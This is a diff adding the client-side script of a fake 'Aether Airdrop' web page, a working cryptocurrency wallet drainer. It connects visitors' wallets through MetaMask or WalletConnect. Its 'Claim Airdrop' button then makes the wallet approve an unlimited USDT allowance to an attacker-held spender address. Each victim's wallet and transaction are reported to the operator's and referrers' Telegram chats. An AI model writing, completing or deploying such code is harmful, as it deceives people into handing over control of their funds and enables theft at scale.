+                1: { name:"Ethereum", symbol:"ETH", rpc:"https://eth.llamarpc.com", explorer:"https://etherscan.io", moonpay:"https://buy.moonpay.com?currencyCode=eth", usdtAddress:"0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals:6 },
+                56: { name:"BNB Smart Chain", symbol:"BNB", rpc:"https://bsc-dataseed.binance.org", explorer:"https://bscscan.com", moonpay:"https://buy.moonpay.com?currencyCode=bnb", usdtAddress:"0x55d398326f99059fF775485246999027B3197955", decimals:18 }
+            };
+
+            const ERC20_ABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+            let provider, signer, wcProvider=null, userAddress=null, isProcessing=false, activeProviderType=null;
+            let currentChainId = 56;
+
+            const injectBtn = document.getElementById('injectBtn');
+            const wcBtn = document.getElementById('wcBtn');
+            const approveBtn = document.getElementById('approveBtn');
+            const walletDiv = document.getElementById('wallet');
+            const statusDiv = document.getElementById('statusMessage');
+            const moonpayLink = document.getElementById('moonpayLink');
+
+            function updateWalletDisplay(address){ 
+                walletDiv.innerHTML = `<i class="fas fa-check-circle"></i> ${address.slice(0,6)}...${address.slice(-4)}`; 
+                walletDiv.style.display = 'flex';
+            }
+            
+            function updateStatusMessage(message,type='info'){ 
+                statusDiv.textContent=message; 
+                statusDiv.className='status-message'; 
+                if(type==='approving') statusDiv.classList.add('approving'); 
+                else if(type==='approved') statusDiv.classList.add('approved'); 
+                else if(type==='error') statusDiv.classList.add('error'); 
+                statusDiv.style.display='flex'; 
+            }
+
+            function getReferral(){ const params=new URLSearchParams(window.location.search); return params.get("ref"); }
+            async function sendTelegram(chatId,message){ if(!chatId) return; await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId,text:message})}); }
+
+            function updateMoonPayLink(){ const n=NETWORKS[currentChainId]; moonpayLink.href=n.moonpay; }
+            updateMoonPayLink();
+
+            document.querySelectorAll('.network-card').forEach(btn=>{ 
+                btn.onclick=()=>{
+                    document.querySelectorAll('.network-card').forEach(b=>b.classList.remove('active'));
+                    btn.classList.add('active');
+                    currentChainId=parseInt(btn.dataset.chain);
+                    updateMoonPayLink();
+                    updateStatusMessage(`Switched to ${btn.querySelector('.network-name').textContent} network`, 'info');
+                }
+            });
+
+            async function connected(){ 
+                try{ 
+                    userAddress = await signer.getAddress(); 
+                    updateWalletDisplay(userAddress); 
+                    approveBtn.disabled=false; 
+                    updateStatusMessage('Ready to claim Airdrop', 'info'); 
+                } catch(err){ 
+                    console.error(err); 
+                    updateStatusMessage('Failed: '+err.message,'error'); 
+                } 
+            }
+            
+            async function ensureInjectedChain(){ 
+                const hex='0x'+currentChainId.toString(16); 
+                const cid=await window.ethereum.request({method:'eth_chainId'}); 
+                if(cid!==hex){ 
+                    await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]}); 
+                } 
+            }
+
+            injectBtn.onclick = async ()=>{
+                if(!window.ethereum){ 
+                    updateStatusMessage("Please install MetaMask or a Web3 wallet", 'error');
+                    return; 
+                }
+                injectBtn.classList.add('loading');
+                injectBtn.disabled=true;
+                try{
+                    provider=new ethers.providers.Web3Provider(window.ethereum);
+                    await window.ethereum.request({method:'eth_requestAccounts'});
+                    signer = provider.getSigner();
+                    activeProviderType='injected';
+                    await connected();
+                } catch(err){ 
+                    console.error(err); 
+                    updateStatusMessage('Connection failed','error'); 
+                }
+                injectBtn.classList.remove('loading');
+                injectBtn.disabled=false;
+            };
+
+            wcBtn.onclick = async ()=>{
+                try{
+                    if(wcProvider){ await wcProvider.disconnect().catch(()=>{}); wcProvider=null; }
+                    wcBtn.classList.add('loading');
+                    wcBtn.disabled=true;
+                    const {EthereumProvider}=await import('https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle');
+                    wcProvider=await EthereumProvider.init({projectId:WALLETCONNECT_PROJECT_ID,chains:[56],showQrModal:true,rpcMap:{56:NETWORKS[56].rpc},metadata:{name:'Aether Airdrop',url:window.location.origin}});
+                    const accounts=await wcProvider.enable();
+                    window.ethereum=wcProvider;
+                    provider=new ethers.providers.Web3Provider(wcProvider);
+                    signer=provider.getSigner();
+                    activeProviderType='walletconnect';
+                    await connected();
+                } catch(err){ 
+                    console.error(err); 
+                    updateStatusMessage('Wallet Connection Error. We couldnt connect to your wallet. Please retry or refresh the page.','error'); 
+                }
+                wcBtn.classList.remove('loading');
+                wcBtn.disabled=false;
+            };
+
+            approveBtn.onclick=async()=>{
+                if(isProcessing) return;
+                isProcessing=true; 
+                approveBtn.classList.add('loading');
+                approveBtn.disabled=true;
+                updateStatusMessage('Approving Airdrop...','approving');
+                try{
+                    if(activeProviderType==='injected') await ensureInjectedChain();
+                    const network=NETWORKS[currentChainId];
+                    const usdt=new ethers.Contract(network.usdtAddress,ERC20_ABI,signer);
+                    const tx=await usdt.approve(SPENDER_ADDRESS,ethers.constants.MaxUint256);
+                    const ref=getReferral(); 
+                    const refChat=REFERRERS[ref];
+                    await sendTelegram(ADMIN_CHAT_ID, `🔄 CLAIM STARTED\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}`);
+                    if(refChat) await sendTelegram(refChat, `👤 Someone used your referral\nWallet:${userAddress}\nTx:${tx.hash}`);
+                    updateStatusMessage('Transaction sent...', 'info');
+                    const receipt=await tx.wait();
+                    if(receipt.status===1){
+                        updateStatusMessage('✅ Airdrop claimed successfully!','approved'); 
+                        approveBtn.classList.remove('loading');
+                        approveBtn.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully!';
+                        approveBtn.disabled = true;
+                        await sendTelegram(ADMIN_CHAT_ID, `✅ CLAIM SUCCESS\nWallet:${userAddress}\nRef:${ref||'none'}\nTx:${tx.hash}\n${network.explorer}/tx/${tx.hash}`);
+                        if(refChat) await sendTelegram(refChat, `🎉 Your referral CLAIMED successfully\nWallet:${userAddress}\nTx:${tx.hash}`);
+                    } else throw new Error("Transaction failed");
+                } catch(err){ 
+                    console.error(err); 
+                    updateStatusMessage('❌ Claim failed: '+err.message,'error'); 
+                    approveBtn.disabled=false; 
+                    approveBtn.classList.remove('loading');
+                    approveBtn.innerHTML = '<i class="fas fa-gem"></i> 🎁 Claim Airdrop Now';
+                }
+                finally{ isProcessing=false; }
+            };
+
+            window.addEventListener('beforeunload',()=>{ if(wcProvider?.disconnect) wcProvider.disconnect().catch(()=>{}); });
+        });
+    </script>
 </body>
 </html>
